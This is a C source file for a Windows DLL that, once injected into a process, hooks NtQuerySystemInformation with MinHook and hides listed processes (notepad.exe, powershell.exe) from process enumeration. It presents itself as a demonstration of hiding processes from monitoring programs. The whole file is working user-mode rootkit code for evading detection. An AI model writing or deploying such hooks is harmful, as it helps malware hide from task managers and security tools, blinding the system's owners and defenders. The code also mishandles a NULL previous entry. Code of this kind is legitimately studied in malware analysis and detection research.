#include "MinHook.h"
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "../Lib/libMinHook.x64.lib")

/* Add the process names to hide here. Process names are case sensitive. */
PWCHAR HiddenProcessList[] = { L"notepad.exe", L"powershell.exe" };

/* Global buffer pointer for dll console messages */
#define MESSAGE_BUFFER_SIZE 2048
PCHAR MessageBuffer;

/* Macro for writing messages to dll console buffer */
#define dll_print(msg, ...)																		    \
	MessageBuffer = (PCHAR)malloc(MESSAGE_BUFFER_SIZE);												\
	memset((void*)MessageBuffer, 0, MESSAGE_BUFFER_SIZE);											\
	if (MessageBuffer != NULL) {																	\
		DWORD BufferLength = wsprintfA(MessageBuffer, msg, __VA_ARGS__);							\
		WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), MessageBuffer, BufferLength, NULL, NULL);	\
		free(MessageBuffer);																		\
	}																								\


typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
fnNtQuerySystemInformation OriginalFunction = 0;


PWCHAR GetProcessName() {
	return ((PPEB)__readgsqword(0x60))->ProcessParameters->ImagePathName.Buffer;
}


NTSTATUS NtQuerySystemInformation_Hooked(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
	/* Execute the original NtQuerySystemInformation function as intended */
	NTSTATUS Status = OriginalFunction(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	/* Only execute modified code if the function was successful, a pointer was returned & process information was queried */
	if (Status == 0x0 && SystemInformation != NULL && SystemInformationClass == SystemProcessInformation) {
		PSYSTEM_PROCESS_INFORMATION CurrentProcess = (PSYSTEM_PROCESS_INFORMATION)SystemInformation,
			PreviousProcess = NULL;

		/* Loop through each SYSTEM_PROCESS_INFROMATION structure pointer */
		while (CurrentProcess->NextEntryOffset != 0) {
			if (CurrentProcess->ImageName.Length && CurrentProcess->ImageName.MaximumLength) {

				/* Check if the process name is present in the list */
				for (unsigned int i = 0; i < (sizeof(HiddenProcessList) / sizeof(PWCHAR)); i++) {
					if (wcsstr(CurrentProcess->ImageName.Buffer, HiddenProcessList[i]) != NULL) {

						/* Remove process by forcing previous process structure to point at the next structure after this one */
						dll_print("[*] %S [ %d ] was hidden from %S [ %d ]\n", CurrentProcess->ImageName.Buffer, CurrentProcess->UniqueProcessId, GetProcessName(), GetCurrentProcessId());
						dll_print("\t> Previous Process -> %S\n\t> Original Offset  -> %d\n", PreviousProcess->ImageName.Buffer, PreviousProcess->NextEntryOffset);
						PreviousProcess->NextEntryOffset += CurrentProcess->NextEntryOffset;
						dll_print("\t> New Offset       -> %d\n", PreviousProcess->NextEntryOffset);
					}
				}
			}

			/* Break loop if the end of the processes was reached */
			if (CurrentProcess->NextEntryOffset == 0) {
				break;
			}

			/* Continue to next process */
			PreviousProcess = CurrentProcess;
			CurrentProcess = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)CurrentProcess + CurrentProcess->NextEntryOffset);
		}
	}
	return Status;
}

VOID InitializeHook()
{
	DWORD Error = 0;
	fnNtQuerySystemInformation pTarget = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");

	if (!GetConsoleWindow()) {
		AllocConsole();
	}
	dll_print("\t===> NtQuerySystemInformation Hook <===\nA demonstration on hiding process from monitoring programs\n\n\n[+] NtQueryInformationHook was loaded in %S [%d]\n", GetProcessName(), GetCurrentProcessId());

	if ((Error = MH_Initialize()) == MH_OK) {
		if ((Error = MH_CreateHook(pTarget, NtQuerySystemInformation_Hooked, (LPVOID*)&OriginalFunction)) == MH_OK) {
			if ((Error = MH_EnableHook(pTarget)) == MH_OK) {
				dll_print("[+] Successfully hooked NtQuerySystemInformation at 0x%p\n", pTarget);
				return;
			}
		}
	}

	dll_print("[-] Failed to enable hook. MinHook error: %d | 0x%0.8X\n", Error, Error);
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		InitializeHook();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

